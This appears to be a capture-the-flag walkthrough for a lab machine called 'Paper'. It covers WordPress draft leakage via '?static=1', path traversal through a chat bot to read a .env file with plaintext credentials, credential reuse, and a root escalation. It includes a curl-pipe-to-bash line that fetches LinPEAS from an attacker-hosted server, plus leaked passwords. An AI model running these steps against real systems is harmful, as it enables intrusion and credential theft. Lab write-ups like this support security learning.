Initially we don't have any ssh credential to access port 22 service. To see more information about the certificate used in ssl/http conection, you can use `openssl`. Openssl is a cryptography toolkit implementing the Secure Sockets Layer (SSL v2/v3) and Transport Layer Security (TLS v1) network protocols and related cryptography standards required by them. 

So running `openssl s_client -connect 10.10.11.143:443` we can see some information about the certificates:
> CN = localhost.localdomain, emailAddress = root@localhost.localdomain \
Verify return code: 19 (self signed certificate in certificate chain)

Go on with the reconnaissance phase, it would be interesting to launch `whatweb` to the tarjet. This is what we have in the http headers: 
> X-Backend[office.paper]

Add to your /etc/hosts file and check how it looks like. 

There is a blog page with comments and there is someone who advises that drafts are not secure... Maybe it's a clue, don't you think?

What content manager does the page use? Wordpress v5.2.3. Search for some vulnerabilities of this version. 


### Exploit vulnerabilities
Looking for an exploit of wordpress v5.2.3. There is one way to see unauthenticated password private post: that adding `?static=1` to a wordpress URL should leak its secret content.
`http://office.paper/?static=1` 

And there is a secret registration URL of new employee chat system: `http://chat.office.paper/register/8qozr226AhkCHZdyY`.
Time to fight with the Recyclops bot. He accepts several questions. Seaching a little bit you can find a special file with credential as plain text `recyclops file ../hubot/.env`. Files like .env usually have some enviornment variables like username or password in plaintext. 

> export ROCKETCHAT\_USER=recyclops \
export ROCKETCHAT\_PASSWORD=Queenofblad3s!23

Use this as dwight credential because it is possible that they are reusing credentials.

### Privilege Scalation
We will use LinPEAS. This is a script that search for possible paths to escalate privileges on Linux/Unix\*/MacOS hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/privilege-escalation).


Download it in your computer and then start a shared service with python `pyhton3 -m http.server 8080`. In the victim machine download this file and execute with bash 'on-the-fly': `curl http://<tuip>:8080/linpeas.sh | bash`
```

Get this CVE and download the poc.sh. Run it in the target machine and you will have a new user:pass --> secnigma:secnigmaftw. Doing `sudo bash` you will be root!

Congratulations.
